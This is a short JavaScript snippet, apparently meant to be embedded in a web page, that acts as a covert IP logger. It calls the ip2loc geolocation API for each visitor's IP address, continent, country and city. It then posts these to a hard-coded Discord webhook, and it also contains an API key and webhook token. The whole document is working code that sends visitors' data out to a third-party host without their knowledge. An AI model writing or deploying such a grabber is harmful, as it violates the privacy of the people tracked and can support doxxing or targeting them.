$.getJSON("https://api.ip2loc.com/ilgmiK08SWjO9LQdRisMI10iWAi9ro9N/detect?include=ip,continent_name,country_name,city,is_proxy", function (result) {
  var request = new XMLHttpRequest();
  request.open("POST", "https://ptb.discord.com/api/webhooks/923601503346884620/BgzTSRyCsEfSaJopio5meKsEMeDKwLJ7UUlsyMWpPb5vzGd3Wd4WvrzNAIpB660R9rAq", true);

  request.setRequestHeader('Content-type', 'application/json');
  var webhook = {
    username: "",
    avatar_url: "",
    content: "",
    embeds: [{
      color: "3092790",
      title: "",
      fields: [
        { name: "IP", value: result.ip },
        { name: "continent", value: result.continent_name },
        { name: "country", value: result.country_name },
        { name: "city", value: result.city },
      ],

    }]
  };

  request.send(JSON.stringify(webhook));
})

